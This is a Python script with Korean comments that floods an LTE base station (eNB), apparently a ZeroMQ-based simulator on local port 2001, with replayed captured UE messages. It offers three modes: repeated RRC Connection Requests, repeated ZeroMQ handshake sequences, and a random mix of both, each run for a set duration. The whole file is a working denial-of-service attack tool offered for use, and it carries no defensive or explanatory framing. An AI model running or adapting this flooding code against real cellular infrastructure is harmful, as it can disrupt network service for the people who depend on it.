#!/usr/bin/env python3
"""
실제 UE 메시지를 사용한 공격
캡처된 실제 UE 메시지를 그대로 사용
"""

import zmq
import struct
import time
import random
import threading
from datetime import datetime

class RealUEAttack:
    def __init__(self, target_port=2001):
        self.target_port = target_port
        self.context = zmq.Context()
        self.running = False
        
        # 실제 캡처된 UE 메시지들
        self.real_messages = [
            # ZeroMQ 헤더
            bytes.fromhex("ff00000000000000017f"),
            # ZeroMQ 메시지 타입
            bytes.fromhex("03"),
            # 실제 RRC Connection Request
            bytes.fromhex("01000001ff"),
            # ZeroMQ 소켓 설정
            bytes.fromhex("04260552454144590b536f636b65742d5479706500000003524551084964656e7469747900000000"),
        ]
        
    def send_real_message(self, message, message_type="Unknown"):
        """실제 UE 메시지 전송"""
        try:
            socket = self.context.socket(zmq.PUSH)
            socket.connect(f"tcp://localhost:{self.target_port}")
            
            socket.send(message, zmq.NOBLOCK)
            socket.close()
            
            print(f"[{datetime.now().strftime('%H:%M:%S')}] {message_type} 전송")
            print(f"  메시지 크기: {len(message)} bytes")
            print(f"  데이터: {message.hex()}")
            return True
            
        except Exception as e:
            print(f"[{datetime.now().strftime('%H:%M:%S')}] {message_type} 전송 실패: {e}")
            return False
    
    def send_zeromq_sequence(self):
        """실제 UE의 ZeroMQ 연결 시퀀스 전송"""
        print(f"=== 실제 UE ZeroMQ 연결 시퀀스 전송 ===")
        
        # 1. ZeroMQ 헤더
        self.send_real_message(self.real_messages[0], "ZeroMQ 헤더")
        time.sleep(0.01)
        
        # 2. ZeroMQ 메시지 타입
        self.send_real_message(self.real_messages[1], "ZeroMQ 메시지 타입")
        time.sleep(0.01)
        
        # 3. 실제 RRC Connection Request
        self.send_real_message(self.real_messages[2], "RRC Connection Request")
        time.sleep(0.01)
        
        # 4. ZeroMQ 소켓 설정
        self.send_real_message(self.real_messages[3], "ZeroMQ 소켓 설정")
        time.sleep(0.01)
    
    def rrc_connection_flood(self, duration=60):
        """RRC Connection Request 플러딩 (실제 UE 메시지 사용)"""
        print(f"=== 실제 UE RRC Connection Request 플러딩 ===")
        print(f"대상 포트: {self.target_port}")
        print(f"지속 시간: {duration}초")
        print("=" * 50)
        
        self.running = True
        start_time = time.time()
        count = 0
        
        while self.running and (time.time() - start_time) < duration:
            # 실제 RRC Connection Request 메시지 사용
            message = self.real_messages[2]  # 01000001ff
            
            if self.send_real_message(message, f"RRC Connection Request #{count+1}"):
                count += 1
            
            time.sleep(0.1)  # 100ms 간격
        
        print(f"\n=== 플러딩 완료 ===")
        print(f"총 {count}개 메시지 전송")
    
    def zeromq_sequence_flood(self, duration=60):
        """ZeroMQ 연결 시퀀스 플러딩"""
        print(f"=== ZeroMQ 연결 시퀀스 플러딩 ===")
        print(f"대상 포트: {self.target_port}")
        print(f"지속 시간: {duration}초")
        print("=" * 50)
        
        self.running = True
        start_time = time.time()
        count = 0
        
        while self.running and (time.time() - start_time) < duration:
            self.send_zeromq_sequence()
            count += 1
            time.sleep(0.5)  # 500ms 간격
        
        print(f"\n=== 플러딩 완료 ===")
        print(f"총 {count}개 시퀀스 전송")
    
    def mixed_flood(self, duration=60):
        """혼합 플러딩 (RRC + ZeroMQ 시퀀스)"""
        print(f"=== 혼합 플러딩 (RRC + ZeroMQ) ===")
        print(f"대상 포트: {self.target_port}")
        print(f"지속 시간: {duration}초")
        print("=" * 50)
        
        self.running = True
        start_time = time.time()
        count = 0
        
        while self.running and (time.time() - start_time) < duration:
            # 50% 확률로 RRC 메시지 또는 ZeroMQ 시퀀스
            if random.random() < 0.5:
                message = self.real_messages[2]  # RRC Connection Request
                self.send_real_message(message, f"RRC Connection Request #{count+1}")
            else:
                self.send_zeromq_sequence()
            
            count += 1
            time.sleep(0.1)  # 100ms 간격
        
        print(f"\n=== 플러딩 완료 ===")
        print(f"총 {count}개 메시지/시퀀스 전송")

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='실제 UE 메시지를 사용한 공격')
    parser.add_argument('--target-port', type=int, default=2001, help='eNB 포트 (기본값: 2001)')
    parser.add_argument('--duration', type=int, default=60, help='공격 지속 시간 (초)')
    parser.add_argument('--attack-type', choices=['rrc', 'zeromq', 'mixed'], 
                       default='mixed', help='공격 유형')
    
    args = parser.parse_args()
    
    attacker = RealUEAttack(args.target_port)
    
    try:
        if args.attack_type == 'rrc':
            attacker.rrc_connection_flood(args.duration)
        elif args.attack_type == 'zeromq':
            attacker.zeromq_sequence_flood(args.duration)
        else:
            attacker.mixed_flood(args.duration)
    except KeyboardInterrupt:
        print("\n사용자에 의해 중단됨")
        attacker.running = False

if __name__ == "__main__":
    main()
